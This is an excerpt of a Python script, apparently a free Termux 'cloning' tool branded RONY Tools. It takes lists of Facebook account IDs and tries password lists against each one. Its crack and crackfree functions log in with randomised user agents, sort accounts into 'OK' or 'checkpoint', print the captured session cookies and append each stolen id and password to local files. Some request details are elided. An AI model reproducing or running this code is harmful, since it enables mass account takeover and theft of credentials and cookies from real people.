...
\033[1;31m[\033[1;34m®\033[1;31m]  \x1b[38;5;46mVersion  \033[1;33m   ● \x1b[38;5;46m10.8
\033[1;31m[\033[1;34m®\033[1;31m]  \x1b[38;5;46mTools  \033[1;33m     ● \x1b[38;5;46mFree
\033[1;31m[\033[1;34m®\033[1;31m]  \x1b[38;5;46mStatus  \033[1;33m    ● \x1b[38;5;46mFile Cloning
...
os.system('espeak -a 300 " Welcome,   to, RONY,  Tools"')
pass
...
def menu():
    ...
    print("""\033[97;1m[\033[92;1m2\033[97;1m] \033[0;92mCONTACT WITH ADMIN""")
    print(f"""\033[97;1m[\033[92;1m3\033[97;1m] \033[92;1mCHECK OK IDz   """)
    print("""\033[97;1m[\033[92;1m0\033[97;1m] \033[0;92mEXIT""")
    print('\033[0;97m=================')
    RONY = input('\x1b[1;92m[+] CHOOSE: ')
    if RONY in ['111']:
        login()
        dump_massal()
    elif RONY in ['1']:
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/Rony.txt  Etc...]')
...
def setting():
    ...
    print('\033[0;91m==================')
    print('\033[0;91m==================')
    print("\033[97;1m[\033[92;1m1\033[97;1m] METHOD 1 [Cookies Show \033[0;91mCP ID Not Show\033[1;37m]")
    print("\033[97;1m[\033[92;1m2\033[97;1m] METHOD 2 [Cp id Show\033[1;37m]")
    print('\033[0;91m==================')
...
def passwrd():
    ...
    print(logo)
    print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m "+uname)
    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mTODAY'S DATE :\033[1;92m "+date)
    print('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mYOUR TOTAL IDz \033[0;97m:\033[1;92m ',str(len(id)))
    print("\033[97;1m[\033[92;1m•\033[97;1m] \x1b[38;5;202mSTARTED YOUR CLONING TIME\033[0;97m :> \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
    print("\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mCLONING SPEED SUPER FAST-!🔥")
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[RONY~XD]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;91m[RONY-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[RONY---0K🆒] {idf} • {pw}\n\033[1;34m[🔥]= COOKIES • \033[0;92m{kuki} ')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[RONY--M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•RONY--0K] {idf} • {pw} ')
                os.system('espeak -a 300 " RONY, OK,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
